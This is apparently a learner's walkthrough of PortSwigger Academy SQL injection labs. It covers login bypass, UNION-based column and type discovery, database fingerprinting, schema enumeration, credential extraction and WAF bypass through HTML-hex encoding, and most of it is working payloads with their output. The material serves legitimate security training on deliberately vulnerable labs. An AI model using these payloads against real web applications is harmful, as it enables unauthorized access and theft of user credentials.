# PortSwigger Academy UNION based SQL injection

## Basic HTTP param injection (non-union)

### SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

>This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:
>
>SELECT * FROM products WHERE category = 'Gifts' AND released = 1
>To solve the lab, perform a SQL injection attack that causes the application to display details of all products in any category, both released and unreleased.
This is a simple challenge to solve. It doesn't require use of the proxy. Discover the vulnerable parameter - in this case it's the product search __category__ param.

Note that in order to inject the SQL, you first need terminate the category string with a single quote and then inject the `OR '1' ='1`. Also note the missing single quote from the end of the injected SQL. You can add the terminating single quote but you would then need to add the comment for the given DB to force the query to disregard anything after the injected command.

`filter?category=Accessories' OR '1' = '1`

_Note: from here on in I will not explain the details of how to discover or inject SQL into a given HTTP param, unless the method of injection changes!_

### SQL injection vulnerability allowing login bypass

>This lab contains a SQL injection vulnerability in the login function.
>
>To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user.

To solve this challenge you apply the same `OR '1' = '1'` SQL injection only this time you're injecting into the password field in the login dialog box.

Open the login dialog box and enter "administrator" into the user field and `' OR '1' = '1` into the password field and then click "log in" button.

The concept is the same as the first challenge. The injected SQL modifies the (following) SQL statement to mean log in if the password matches the specified users password `OR` `1` is equal to `1` - which it always is!

Application query:

```sql
SELECT username from users WHERE username = 'input-username' AND password = 'input-password'
```

post injection query:

```sql
SELECT username from users WHERE username = 'input-username' AND password = 'input-password' OR '1' = '1'
```

## UNION based SQL injection

### SQL injection UNION attack, determining the number of columns returned by the query

>This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.
>
>To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.

For a UNION attack to be successful the `UNION SELECT` must return the same number of types of data as the actual query. To determine the number of columns (but not the types) the inject a `NULL` column into the `UNION SELECT` successively until the query returns data successfully.

```sql
` UNION SELECT NULL, NULL--
```
Each attempt add a new `,NULL` to the `SELECT`.

### SQL injection UNION attack, finding a column containing text

>This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.
>
>The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

First task is to determine the number of columns

```sql
UNION SELECT NULL,NULL,NULL--
```

Next need to increment over each `NULL` starting from the first one and replace it with a char in quotes `'a'`

```sql
UNION SELECT 'a',NULL,NULL--
```
returns error

```sql
UNION SELECT NULL,'a',NULL--
```
returns success with data from the table and the value 'a' injected into the query.

Note that the actual objective:
>To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided

Replace the `'a'` value with the random value provided in the task to solve the lab.

### SQL injection UNION attack, retrieving data from other tables

>This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.
>
>The database contains a different table called users, with columns called username and password.
>
>To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

This lab builds on previous labs - inject a `UNION` attack command to retrieve user data from the `users` Table.

To solve the lab you need to use the administrator username and password to log in.

firstly, (as before) determine how many columns are being returned and which ones are type string.

```sql
' UNION SELECT NULL,NULL--
```
```shell
' UNION SELECT 'a','a'--
```
2 columns of type string
```sql
' UNION SELECT username,password FROM users--
```

### SQL injection UNION attack, retrieving multiple values in a single column

>This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
>
>The database contains a different table called users, with columns called username and password.
>
>To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

This lab is the same as the previous lab but the number of string columns (1) preclude using a `UNION SELECT` query returning both username and password.

The solution is simply to concatenate the username and password together into a single column. Note the concat method depends on the DB backend (see [SQL injection cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet))

`' UNION SELECT NULL,username||'~'||password FROM users--`

### SQL injection attack, querying the database type and version on Oracle

>This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
>
>To solve the lab, display the database version string.

Note: `SELECT` statements for Oracle must have a valid `FROM` statement referencing an actual table. To get around this you can use Table `dual` in Oracle.

Use the [SQL injection cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) 

To solve this lab we need to retrieve the database version information from the Oracle DB.

Firstly (as always) determine how many columns and what type they are.

`'UNION SELECT 'a','b' FROM dual--`

Next we can obtain the DB version using the following injected SQL:

`' UNION SELECT banner FROM v$version--`

### SQL injection attack, querying the database type and version on MySQL and Microsoft

>This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
>
>To solve the lab, display the database version string.

Same as previous but this time against Microsoft or MySQL. There is only one server (not both) but the commands are the same for both. So the question is which DB is this example? The commands are the same **but** the comment syntax is subtly different and beware (this caught me out scratching my head!).

Comments for Microsoft and MySQL DBs are the same except the MySQL `--` must have a space straight after it. This space needs to be URL encoded too as it's being passed as a param (%20)

So now we know that, the command to determine the number of columns looks like this:

`' UNION SELECT 'a','b'--%20`

And the command to solve the lab:

`' 'UNION SELECT @@version,NULL--%20`

### SQL injection attack, listing the database contents on non-Oracle databases

>This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
>
>The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
>
>To solve the lab, log in as the administrator user.

For this lab we'll need to retrieve DB metadata for none Oracle DB.

Firstly determine the number of columns and their types:

`' UNION SELECT 'a','b'--`

Next try running the version commands and see what they give us:

`' UNION SELECT @@version,NULL--` - ok this failed so we now know the DB is PostgrSQL, but still run the following command anyway:

`' UNION SELECT version(),NULL--`

output: `PostgreSQL 12.14 (Ubuntu 12.14-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit`

Consult the [SQL injection cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) to get the command to retrieve PostgreSQL DB metadata:

`SELECT * FROM information_schema.tables` - note this command returns * (all columns) and we have already determined that the `UNION SELECT` will only accept 2 columns of type string. Therefore we need to work out what the columns are by finding the documentation online - [PostgreSQL resource](https://www.delftstack.com/howto/postgres/postgresql-select-all-tables/)

The columns we need to reference are `table_schema` and `table_name`.

`' UNION SELECT table_schema,table_name FROM information_schema.tables--`

output was extensive but I strongly suspect the following table contains the user information we are looking for:

```
public
users_hfexfy
```

We now have a table name and need to determine the columns in the table:

`' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'users_hfexfy'--`

Great, that returned:

```
username_kvmhbx
password_gcwpdi
```

Now to retrieve all the usernames and passwords:

`' UNION SELECT username_kvmhbx,password_gcwpdi FROM users_hfexfy--`

That worked, list of usernames and passwords:

```
wiener
REDACTED
carlos
REDACTED
administrator
REDACTED
```

### SQL injection attack, listing the database contents on Oracle

>This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
>
>The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
>
>To solve the lab, log in as the administrator user.

Same approach as the previous lab but against an Oracle DB.

A couple of things to note: the SQL query is differnt for Oracle and the `FROM` clause must reference `dual` Table.

`' UNION SELECT owner,table_name FROM all_tables--`

output summary (searching for 'users'):

```
PETER
USERS_IYWPQM
XDB
APP_USERS_AND_ROLES
```

`' UNION SELECT COLUMN_NAME,NULL FROM all_tab_columns WHERE table_name = 'USERS_IYWPQM'--`


```
PASSWORD_AQFTLW
USERNAME_HLXUTO
```

`' UNION SELECT USERNAME_HLXUTO,PASSWORD_AQFTLW FROM USERS_IYWPQM--`

list of usernames and passwords:

```
administrator
REDACTED
carlos
REDACTED
wiener
REDACTED
```

### SQL injection with filter bypass via XML encoding

>This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.
>
>The database contains a users table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account.

Firstly determine what DB we are dealing with.

I decided to use timeout to achieve this

` UNION SELECT 'a'||pg_slee(10)`

encode it as HTML HEX using Burp menu right-click => "Convert Selection" => "HTML" => "HTML-encode all characters (hex-entries)"

`&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x27;&#x61;&#x27;&#x7c;&#x7c;&#x70;&#x67;&#x5f;&#x73;&#x6c;&#x65;&#x65;&#x70;&#x28;&#x31;&#x30;&#x29;`

That determines we are targetting PostgreSQL backend

Now inject SQL to retreive the full list of users and passwords from `users` Table. Note that the `UNION` can only select 1 field so concat usersname with password.

` UNION SELECT username||'~'||password FROM users`

encoded to !

`&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x7c;&#x7c;&#x27;&#x7e;&#x27;&#x7c;&#x7c;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;`

Results:

```
wiener~REDACTED
administrator~REDACTED
carlos~REDACTED
```
